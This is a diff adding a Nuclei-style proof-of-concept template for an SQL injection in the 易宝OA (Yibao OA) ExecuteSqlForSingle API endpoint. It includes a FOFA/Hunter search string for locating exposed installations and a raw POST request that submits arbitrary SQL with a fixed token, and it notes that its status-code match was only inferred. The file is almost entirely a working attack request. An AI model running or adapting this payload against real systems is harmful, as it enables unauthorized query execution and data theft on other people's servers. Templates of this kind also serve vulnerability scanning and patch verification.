@@ -1,0 +1,32 @@
+id: poc-76fb982eba0144bf8eca
+info:
+  name: 易宝OAExecuteSqlForSingleSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/76fb982eba0144bf8eca86ba6990ad79
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 76fb982eba0144bf8eca86ba6990ad79
+    fofa: + hunter`web.title="欢迎登录易宝OA系统"||banner="易宝OA"`
+http:
+- raw:
+  - 'POST /api/system/ExecuteSqlForSingle HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Length: 103
+
+
+    token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123456'')),3,32)&strParameters='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
